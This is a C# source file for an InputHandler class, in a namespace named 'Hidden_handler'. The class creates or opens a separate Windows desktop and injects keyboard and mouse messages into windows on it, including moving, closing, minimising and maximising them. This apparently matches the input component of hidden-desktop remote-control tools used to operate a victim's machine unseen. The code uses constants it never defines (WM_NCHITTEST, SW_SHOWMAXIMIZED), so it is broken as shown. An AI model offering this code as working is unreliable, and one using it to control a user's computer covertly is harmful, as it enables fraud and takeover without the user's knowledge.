using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Hidden_handler
{
    public class InputHandler : IDisposable
    {
        private enum DESKTOP_ACCESS : uint
        {
                DESKTOP_NONE = 0,
                DESKTOP_READOBJECTS = 0x0001,
                DESKTOP_CREATEWINDOW = 0x0002,
                DESKTOP_CREATEMENU = 0x0004,
                DESKTOP_HOOKCONTROL = 0x0008,
                DESKTOP_JOURNALRECORD = 0x0010,
                DESKTOP_JOURNALPLAYBACK = 0x0020,
                DESKTOP_ENUMERATE = 0x0040,
                DESKTOP_WRITEOBJECTS = 0x0080,
                DESKTOP_SWITCHDESKTOP = 0x0100,
                GENERIC_ALL = (uint)(DESKTOP_READOBJECTS | DESKTOP_CREATEWINDOW | DESKTOP_CREATEMENU |
                        DESKTOP_HOOKCONTROL | DESKTOP_JOURNALRECORD | DESKTOP_JOURNALPLAYBACK |
                        DESKTOP_ENUMERATE | DESKTOP_WRITEOBJECTS | DESKTOP_SWITCHDESKTOP),
        }

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, uint dwDesiredAccess);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice,
                IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool CloseDesktop(IntPtr hDesktop);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SetThreadDesktop(IntPtr hDesktop);

        [DllImport("user32.dll")]
        public static extern IntPtr WindowFromPoint(POINT point);

        [DllImport("user32.dll")]
        public static extern IntPtr SendMessage(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        public static extern IntPtr PostMessage(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

        [DllImport("user32.dll")]
        public static extern bool ScreenToClient(IntPtr hWnd, ref POINT lpPoint);

        [DllImport("user32.dll")]
        public static extern IntPtr ChildWindowFromPoint(IntPtr hWnd, POINT point);

        [DllImport("user32.dll")]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll")]
        public static extern bool PtInRect(ref RECT lprc, POINT pt);

        [DllImport("user32.dll")]
        public static extern bool SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

        [DllImport("user32.dll")]
        public static extern int GetWindowLong(IntPtr hWnd, int nIndex);

        [DllImport("user32.dll")]
        public static extern bool GetWindowPlacement(IntPtr hWnd, ref WINDOWPLACEMENT lpwndpl);

        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        public static extern int MenuItemFromPoint(IntPtr hWnd, IntPtr hMenu, POINT pt);

        [DllImport("user32.dll")]
        public static extern int GetMenuItemID(IntPtr hMenu, int nPos);

        [DllImport("user32.dll")]
        public static extern IntPtr GetSubMenu(IntPtr hMenu, int nPos);

        [DllImport("user32.dll")]
        public static extern bool MoveWindow(IntPtr hWnd, int x, int y, int width, int height, bool repaint);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int RealGetWindowClass(IntPtr hwnd, [Out] StringBuilder pszType, int cchType);

        [StructLayout(LayoutKind.Sequential)]
        public struct POINT
        {
                public int x;
                public int y;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
                public int left;
                public int top;
                public int right;
                public int bottom;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct WINDOWPLACEMENT
        {
                public int length;
                public int flags;
                public int showCmd;
                public POINT ptMinPosition;
                public POINT ptMaxPosition;
                public RECT rcNormalPosition;
        }

        private const int GWL_STYLE = -16;
        private const int WS_DISABLED = 0x8000000;
        private const int WM_CHAR = 0x0102;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_LBUTTONUP = 0x0202;
        private const int WM_LBUTTONDOWN = 0x0201;
        private const int WM_MOUSEMOVE = 0x0200;
        private const int WM_CLOSE = 0x0010;
        private const int WM_SYSCOMMAND = 0x0112;
        private const int SC_MINIMIZE = 0xF020;
        private const int SC_RESTORE = 0xF120;
        private const int SC_MAXIMIZE = 0xF030;
        private const int HTCAPTION = 2;
        private const int HTCLOSE = 20;
        private const int HTMINBUTTON = 8;
        private const int HTMAXBUTTON = 9;

        private POINT lastPoint = new POINT() { x = 0, y = 0 };
        private IntPtr hResMoveWindow = IntPtr.Zero;
        private IntPtr resMoveType = IntPtr.Zero;
        private bool lmouseDown = false;

        private static object lockObject = new object();

        string DesktopName = null;
        public IntPtr Desktop = IntPtr.Zero;

        public InputHandler(string DesktopName)
        {
                this.DesktopName = DesktopName;
                IntPtr Desk = OpenDesktop(DesktopName, 0, true, (uint)DESKTOP_ACCESS.GENERIC_ALL);
                if (Desk == IntPtr.Zero)
                {
                        Desk = CreateDesktop(DesktopName, IntPtr.Zero, IntPtr.Zero, 0, (uint)DESKTOP_ACCESS.GENERIC_ALL, IntPtr.Zero);
                }
                Desktop = Desk;
        }

        public void Dispose()
        {
                CloseDesktop(Desktop);
                GC.Collect();
        }

        public static int GET_X_LPARAM(IntPtr lParam)
        {
                return (short)(lParam.ToInt32() & 0xFFFF);
        }

        public static int GET_Y_LPARAM(IntPtr lParam)
        {
                return (short)((lParam.ToInt32() >> 16) & 0xFFFF);
        }

        public static IntPtr MAKELPARAM(int lowWord, int highWord)
        {
                int lParam = (highWord << 16) | (lowWord & 0xFFFF);
                return new IntPtr(lParam);
        }

        public void Input(uint msg, IntPtr wParam, IntPtr lParam)
        {
                lock (lockObject)
                {
                        SetThreadDesktop(Desktop);
                        IntPtr hWnd = IntPtr.Zero;
                        POINT point;
                        bool mouseMsg = false;

                        switch (msg)
                        {
                                case WM_CHAR:
                                case WM_KEYDOWN:
                                case WM_KEYUP:
                                {
                                        point = lastPoint;
                                        hWnd = WindowFromPoint(point);
                                        break;
                                }
                                default:
                                {
                                        mouseMsg = true;
                                        point.x = GET_X_LPARAM(lParam);
                                        point.y = GET_Y_LPARAM(lParam);
                                        hWnd = WindowFromPoint(point);

                                        if (msg == WM_MOUSEMOVE)
                                        {
                                                if (!lmouseDown)
                                                        break;

                                                if (hResMoveWindow == IntPtr.Zero)
                                                        resMoveType = SendMessage(hWnd, WM_NCHITTEST, IntPtr.Zero, lParam);
                                                else
                                                {
                                                        hWnd = hResMoveWindow;
                                                }

                                                int moveX = lastPoint.x - point.x;
                                                int moveY = lastPoint.y - point.y;

                                                RECT rect;
                                                GetWindowRect(hWnd, out rect);

                                                int x = rect.left;
                                                int y = rect.top;
                                                int width = rect.right - rect.left;
                                                int height = rect.bottom - rect.top;

                                                switch (resMoveType.ToInt32())
                                                {
                                                        case HTCAPTION:
                                                        {
                                                                x -= moveX;
                                                                y -= moveY;
                                                                break;
                                                        }
                                                        case HTCLOSE:
                                                        {
                                                                PostMessage(hWnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
                                                                break;
                                                        }
                                                        case HTMINBUTTON:
                                                        {
                                                                PostMessage(hWnd, WM_SYSCOMMAND, new IntPtr(SC_MINIMIZE), IntPtr.Zero);
                                                                break;
                                                        }
                                                        case HTMAXBUTTON:
                                                        {
                                                                WINDOWPLACEMENT windowPlacement = new WINDOWPLACEMENT();
                                                                windowPlacement.length = Marshal.SizeOf(windowPlacement);
                                                                GetWindowPlacement(hWnd, ref windowPlacement);
                                                                if ((windowPlacement.flags & SW_SHOWMAXIMIZED) != 0)
                                                                        PostMessage(hWnd, WM_SYSCOMMAND, new IntPtr(SC_RESTORE), IntPtr.Zero);
                                                                else
                                                                        PostMessage(hWnd, WM_SYSCOMMAND, new IntPtr(SC_MAXIMIZE), IntPtr.Zero);
                                                                break;
                                                        }
                                                }

                                                MoveWindow(hWnd, x, y, width, height, false);
                                                hResMoveWindow = hWnd;
                                                return;
                                        }

                                        break;
                                }
                        }

                        for (IntPtr currHwnd = hWnd; ;)
                        {
                                hWnd = currHwnd;
                                ScreenToClient(hWnd, ref point);
                                currHwnd = ChildWindowFromPoint(hWnd, point);
                                if (currHwnd == IntPtr.Zero || currHwnd == hWnd)
                                        break;
                        }

                        if (mouseMsg)
                        {
                                lParam = MAKELPARAM(point.x, point.y);
                        }

                        PostMessage(hWnd, msg, wParam, lParam);
                }
        }
    }
}
